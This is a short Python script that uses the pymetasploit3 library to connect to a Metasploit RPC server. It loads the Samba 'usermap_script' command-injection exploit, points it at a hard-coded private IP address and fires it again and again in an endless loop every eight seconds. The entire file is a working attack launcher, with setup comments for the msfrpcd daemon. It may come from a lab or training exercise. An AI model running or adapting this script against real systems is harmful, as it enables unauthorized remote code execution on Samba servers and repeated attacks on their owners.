from pymetasploit3.msfrpc import MsfRpcClient
import time

# You MUST configure the MSFRPCD utility BEFORE running this script.
# Run the following command: msfrpcd -P <password> -U msf -S -p <port>
# The same password and port should be used when logging in through the MsfRpcClient in the below script

if __name__ == "__main__":
    TARGET_IP = "192.168.21.3"

    client = MsfRpcClient("", port=1)  # login with password and correct port

    exploit = client.modules.use("exploit", "multi/samba/usermap_script")
    exploit["RHOSTS"] = TARGET_IP

    print("Ctrl + C to stop exploit")
    while True:
        try:
            exploit.execute()
            print(f"Samba exploit on {TARGET_IP}")
        except Exception as e:
            print(f"Error performing exploit: {e}")
        finally:
            time.sleep(8)
